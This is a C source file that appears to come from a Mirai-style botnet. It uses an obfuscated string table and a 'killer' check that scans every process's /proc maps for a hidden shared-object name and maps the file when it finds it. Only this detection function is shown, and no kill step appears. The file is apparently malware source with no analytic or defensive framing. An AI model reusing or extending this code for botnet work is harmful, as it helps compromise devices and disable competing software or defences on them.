#define _GNU_SOURCE

#include <stdio.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <dirent.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <fcntl.h>

#include "includes.h"
#include "util.h"
#include "table.h"

int find_so_mapping() 
{
    DIR *proc_dir = opendir(enc[PROC_DIR_2].string);

    if (!proc_dir) 
    {
        return -1;
    }

    struct dirent *entry;
    char maps_path[4096];
    char buffer[8192];

    while ((entry = readdir(proc_dir)) != NULL) 
    {
        if (entry->d_type == DT_DIR) 
        {
            int pid = atoi(entry->d_name);

            if (pid != 0) 
            {
                snprintf(maps_path, sizeof(maps_path), "/proc/%d/maps", pid);

                int maps_fd = open(maps_path, O_RDONLY);
                if (maps_fd == -1) 
                {
                    continue;
                }

                ssize_t bytes_read = read(maps_fd, buffer, sizeof(buffer) - 1);
                if (bytes_read == -1 || bytes_read <= 1) 
                {
                    close(maps_fd);
                    continue;
                }

                buffer[bytes_read] = '\0';
                close(maps_fd);

                char *line = buffer;

                while ((line = strstr(line, enc[KILLER_CHECK_SO].string)) != NULL)
                {
                    while (line > buffer && *line != '\n' && *line != ' ') 
                    {
                        line--;
                    }
                    
                    if (*line == '\n' || *line == ' ')
                    {
                        line++;
                    }

                    char *end = strchr(line, '\n');

                    if (end == NULL || end >= buffer + bytes_read) 
                    {
                        break;
                    }

                    *end = '\0';
                    int fd = open(line, O_RDONLY);

                    if (fd != -1) 
                    {
                        void *mapped_memory = mmap(NULL, 4096, PROT_READ, MAP_PRIVATE, fd, 0);

                        if (mapped_memory != MAP_FAILED) 
                        {
                            close(fd);
                            closedir(proc_dir);
                            return 0;  // Found a mapped .so file
                        }

                        close(fd);
                    }

                    line = end + 1;
                }
            }
        }
    }

    closedir(proc_dir);
    return -1;
}

